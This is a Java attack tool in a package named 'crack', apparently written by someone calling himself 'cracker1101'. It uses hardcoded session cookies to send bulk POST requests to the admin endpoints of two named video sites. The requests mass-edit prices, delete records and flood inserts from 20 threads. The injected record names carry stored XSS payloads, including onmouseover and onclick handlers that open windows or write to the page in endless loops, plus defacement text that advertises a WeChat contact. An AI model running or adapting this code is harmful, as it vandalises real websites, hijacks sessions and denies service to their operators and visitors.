package com.smile.azxx.crack;

import com.smile.azxx.util.RandomGUID;
import org.apache.commons.collections.MapUtils;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URI;
import java.util.*;

/**
 * Created by smile on 2018/5/26.
 */
//http://www.zzsx999.com/index.php/dailihoutai/pianku/my.html
public class DeleteVideoSix {

    public static void main(String[] args) {

//       insertVideo();
//       addPoint();
//        updateVideoName();
        updatePrice();
//        deleteVideo();
    }

    public static void deleteVideo(){
        Thread thread1 = new Thread(){
            @Override
            public void run() {
                Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
                for (int i = 9553; i > 6000; i--) {
                    System.out.println("开始ID:"+i);
                    map.put("id",i+"");
                    String dinghuiCookie = "PHPSESSID=tbksa100h8ip85lsi04nc2vbl0; _d_id=4ad3420b417df9547109684844f344";
                    doPost("http://www.zzsx999.com/index.php/dailihoutai/pianku/saveprice.html",map,dinghuiCookie);
                }
            }
        };
        thread1.start();

        Thread thread2 = new Thread(){
            @Override
            public void run() {
                Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
                for (int i = 6000; i > 3000; i--) {
                    System.out.println("开始ID:"+i);
                    map.put("id",i+"");
                    String dinghuiCookie = "PHPSESSID=tbksa100h8ip85lsi04nc2vbl0; _d_id=4ad3420b417df9547109684844f344";
                    doPost("http://www.zzsx999.com/index.php/dailihoutai/pianku/saveprice.html",map,dinghuiCookie);
                }
            }
        };
        thread2.start();

        Thread thread3 = new Thread(){
            @Override
            public void run() {
                Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
                for (int i = 3000; i > 0; i--) {
                    System.out.println("开始ID:"+i);
                    map.put("id",i+"");
                    String dinghuiCookie = "PHPSESSID=tbksa100h8ip85lsi04nc2vbl0; _d_id=4ad3420b417df9547109684844f344";
                    doPost("http://www.zzsx999.com/index.php/dailihoutai/pianku/saveprice.html",map,dinghuiCookie);
                }
            }
        };
        thread3.start();


    }

    public static void insertVideo( ){
        for (int j = 0; j < 20; j++) {
            System.out.println("线程："+j);
            Thread thread = new Thread(){
                public void run(){
                    Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
                    map.put("sj","0");
                    map.put("money","0-0.1");
                    map.put("url","http://www.baidu.com");
                    for (int i = 101000; i < 100000000; i++) {
                        String uid = new RandomGUID().getUUID32();
                        map.put("userid",(10000+(int)(Math.random()*300+1))+"");
//                        map.put("userid",(10161+""));
                        map.put("zykey",uid);
                        map.put("name","cracker1101 又回来了！");
//                        map.put("name","做我们这个平台是一群SB！"+i+uid+"1\"onmouseover=alert(9619)\"");
                        String dinghuiCookie = "PHPSESSID=0eiopomq4o8ted4ujo6lt6hct7";
                        doPost("http://www.145syw.cn/pc/shipinto.php",map,dinghuiCookie);
                    }                }
            };
            thread.start();
        }
    }

    public static void doPost(String url, Map params,String cookie) {

        BufferedReader in = null;
        try {
            // 定义HttpClient
            CloseableHttpClient client = HttpClients.createDefault();
            // 实例化HTTP方法
            HttpPost request = new HttpPost();
            request.setURI(new URI(url));

//            request.addHeader("Cookie","PHPSESSID=nh940c8k4bl8u3uchhcqnmfkh4");
            request.addHeader("Cookie",cookie);
            //设置参数
            List<NameValuePair> nvps = new ArrayList<>();
            if (!MapUtils.isEmpty(params)) {
                for (Iterator iter = params.keySet().iterator(); iter.hasNext(); ) {
                    String name = (String) iter.next();
                    String value = String.valueOf(params.get(name));
                    nvps.add(new BasicNameValuePair(name, value));
                    //System.out.println(name +"-"+value);
                }
            }
            request.setEntity(new UrlEncodedFormEntity(nvps, "utf-8"));

            HttpResponse response = client.execute(request);
            int code = response.getStatusLine().getStatusCode();
            if (code == 200) {    //请求成功
                in = new BufferedReader(new InputStreamReader(response.getEntity()
                        .getContent(), "utf-8"));
                StringBuffer sb = new StringBuffer("");
                String line = "";
                String NL = System.getProperty("line.separator");
                while ((line = in.readLine()) != null) {
                    sb.append(line + NL);
                }

                in.close();
                System.out.println(sb.toString());
            } else {   //
                System.out.println("状态码：" + code);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void addPoint(){
        for (int j = 0; j < 20; j++) {
            System.out.println("线程："+j);
            Thread thread = new Thread(){
                public void run(){
                    Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
                    map.put("cz","wzfb");
//                    map.put("name","SBSBSBSBSBS");
//                    map.put("url","www.baidu.com");
                    for (int i = 101000; i < 100000000; i++) {
                        String uid = new RandomGUID().getUUID32();
                        map.put("userid",(10000+(int)(Math.random()*300+1))+"");
//                        map.put("userid",10003+"");
//                        map.put("zykey",uid);
                        System.out.println((10000+(int)(Math.random()*200+1))+"");
                        map.put("name","cracker1101又回来了！"+i+uid+"1\"onmouseover=while(true){window.open(document.URL);}\"");
                        String dinghuiCookie = "PHPSESSID=0eiopomq4o8ted4ujo6lt6hct7";
                        doPost("http://www.145syw.cn/pc/update.php",map,dinghuiCookie);
                    }                }
            };
            thread.start();
        }
    }


    public static void updateVideoName(){
        Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
        for (int i = 1010; i > 0; i--) {

            System.out.println("开始ID:"+i );
            map.put("cz","name");
            map.put("id",i+"");
            map.put("name","<a href=# onclick=while(true)document.write(2222);>请联系微信cracker1101 提供技术解决方案</a>");
//            map.put("name","请联系微信cracker1101 提供技术解决方案");
            String dinghuiCookie = "0eiopomq4o8ted4ujo6lt6hct7";
            doPost("http://www.145syw.cn/pc/update.php",map,dinghuiCookie);
        }

    }
    //11014
    public static void updatePrice(){

        Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
        for (int i = 10998; i > 10000; i--) {
            System.out.println("开始ID:"+i);
            map.put("price",39.99+"");
            map.put("id",i+"");
            String dinghuiCookie = "PHPSESSID=tbksa100h8ip85lsi04nc2vbl0; _d_id=4ad1bf608015ac547109684844f344";
            doPost("http://www.zzsx999.com/index.php/dailihoutai/pianku/saveprice.html",map,dinghuiCookie);
        }

//        Thread thread1 = new Thread(){
//            @Override
//            public void run() {
//                Map<String,String> map = new HashMap<>();
////                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
//                for (int i = 11053; i > 10353; i--) {
//                    System.out.println("开始ID:"+i);
//                    map.put("price",39.99+"");
//                    map.put("id",i+"");
//                    String dinghuiCookie = "PHPSESSID=tbksa100h8ip85lsi04nc2vbl0; _d_id=4ad1bf608015ac547109684844f344";
//                    doPost("http://www.zzsx999.com/index.php/dailihoutai/pianku/saveprice.html",map,dinghuiCookie);
//                }
//            }
//        };
//        thread1.start();

//        Thread thread2 = new Thread(){
//            @Override
//            public void run() {
//                Map<String,String> map = new HashMap<>();
////                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
//                for (int i = 10353; i > 10053; i--) {
//                    System.out.println("开始ID:"+i);
//                    map.put("price",39.99+"");
//                    map.put("id",i+"");
//                    String dinghuiCookie = "PHPSESSID=tbksa100h8ip85lsi04nc2vbl0; _d_id=4ad1bf608015ac547109684844f344";
//                    doPost("http://www.zzsx999.com/index.php/dailihoutai/pianku/saveprice.html",map,dinghuiCookie);
//                }
//            }
//        };
//        thread2.start();

//        Thread thread3 = new Thread(){
//            @Override
//            public void run() {
//                Map<String,String> map = new HashMap<>();
////                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
//                for (int i = 3000; i > 0; i--) {
//                    System.out.println("开始ID:"+i);
//                    map.put("price",39.99+"");
//                    map.put("id",i+"");
//                    String dinghuiCookie = "PHPSESSID=tbksa100h8ip85lsi04nc2vbl0; _d_id=4ad1bf608015ac547109684844f344";
//                    doPost("http://www.zzsx999.com/index.php/dailihoutai/pianku/saveprice.html",map,dinghuiCookie);
//                }
//            }
//        };
//        thread3.start();
//

    }
}
